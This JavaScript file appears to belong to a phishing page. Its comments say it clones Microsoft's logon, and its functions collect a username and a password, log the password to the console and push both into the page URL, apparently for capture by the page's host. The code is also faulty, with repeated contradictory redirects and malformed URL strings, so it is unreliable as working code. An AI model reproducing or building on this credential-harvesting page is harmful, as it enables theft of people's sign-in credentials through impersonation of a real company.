﻿window.onload = function(){

    console.log("users goto the website")

    console.log("finish the content")
 
    console.log("clone the microsoft's logon")

    return true
}

function logon(){
    var usersname=document.getElementById("usersname").value;
    if
    (
        usersname == ""
    )
    {
        alert("用户名不可为空")
        return true
    }
    else
    {
        var next = "'" + "usersname=" + usersname ;

        window.location.href = "pass.html";

        window.location.href = next ;

        window.location.href = "pass.html";

        window.location.href = next ;

        window.location.href = "pass.html" ;

        return true

    }

}

function finish()
{
    var password = document.getElementById("password").value;

    if
    (
        password == ""
    )
    {
        alert("密码不可为空");

        console.log("users password is space")

        return true

    }
    else 
    {
        console.log("password = " + password);

        var passinfo = "'" + "password=" + password ;

        window.location.href = passinfo 

        return true

    }

}

function onback()
{
    var back = document.getElementById("back").style.backgroundColor="darkgrey";

    console.log("user's mouse on the button")

    return true

}

function outback()
{
    var back = document.getElementById("back").style.backgroundColor="white";

    console.log("user's moues out the button")

    return true
}

function back()
{
    window.location.href = "index.html" ;

    return true
}
